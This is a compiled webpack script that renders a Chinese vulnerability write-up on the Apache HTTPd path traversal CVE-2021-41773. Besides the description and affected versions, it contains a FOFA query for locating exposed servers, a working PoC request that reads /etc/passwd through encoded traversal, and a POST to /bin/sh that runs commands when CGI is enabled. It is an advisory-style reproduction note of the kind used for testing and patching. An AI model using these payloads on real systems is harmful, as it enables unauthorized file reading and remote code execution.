(window.webpackJsonp=window.webpackJsonp||[]).push([[427],{2301:function(s,a,t){s.exports=t.p+"assets/img/1633685599184-d9c836db-1324-49ae-a642-702c8b5bce78-20220308094317679.011a301a.png"},2302:function(s,a,t){s.exports=t.p+"assets/img/1633685786125-ff050193-f7dd-45a9-a867-8f0c801f0024.a9b9fa63.png"},2911:function(s,a,t){"use strict";t.r(a);var r=t(75),e=Object(r.a)({},(function(){var s=this,a=s.$createElement,r=s._self._c||a;return r("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[r("h1",{attrs:{id:"apache-httpd-路径穿越漏洞-cve-2021-41773"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#apache-httpd-路径穿越漏洞-cve-2021-41773"}},[s._v("#")]),s._v(" Apache HTTPd 路径穿越漏洞 CVE-2021-41773")]),s._v(" "),r("h2",{attrs:{id:"漏洞描述"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),r("p",[s._v("Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.49~2.4.50-本中存在一个漏洞，可读取服务器中的任意文件")]),s._v(" "),r("h2",{attrs:{id:"漏洞影响"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v("Apache HTTPd  2.4.49~2.4.50版本")]),r("br"),s._v(" "),r("h2",{attrs:{id:"网络测绘"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[r("a-button",{attrs:{href:"https://fofa.info/result?qbase64=c2VydmVyPSJBcGFjaGUvMi40LjQ5IiA%3D"}},[s._v('server="Apache/2.4.49" ')])],1),s._v(" "),r("h2",{attrs:{id:"漏洞复现"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),r("p",[s._v("通过响应包获取 Apache版本")]),s._v(" "),r("p",[r("img",{attrs:{src:t(2301),alt:"img"}})]),s._v(" "),r("p",[s._v("验证POC")]),s._v(" "),r("div",{staticClass:"language-php line-numbers-mode"},[r("pre",{pre:!0,attrs:{class:"language-php"}},[r("code",[r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("cgi"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("bin"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("etc"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("passwd\n")])]),s._v(" "),r("div",{staticClass:"line-numbers-wrapper"},[r("span",{staticClass:"line-number"},[s._v("1")]),r("br")])]),r("p",[r("img",{attrs:{src:t(2302),alt:"img"}})]),s._v(" "),r("p",[s._v("开启CGI的情况下可RCE")]),s._v(" "),r("div",{staticClass:"language-php line-numbers-mode"},[r("pre",{pre:!0,attrs:{class:"language-php"}},[r("code",[r("span",{pre:!0,attrs:{class:"token constant"}},[s._v("POST")]),s._v(" "),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("cgi"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("bin"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("bin"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("sh\n  \n"),r("span",{pre:!0,attrs:{class:"token constant"}},[s._v("B")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("id")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("tmp"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("id_txt\n")])]),s._v(" "),r("div",{staticClass:"line-numbers-wrapper"},[r("span",{staticClass:"line-number"},[s._v("1")]),r("br"),r("span",{staticClass:"line-number"},[s._v("2")]),r("br"),r("span",{staticClass:"line-number"},[s._v("3")]),r("br")])])],1)}),[],!1,null,null,null);a.default=e.exports}}]);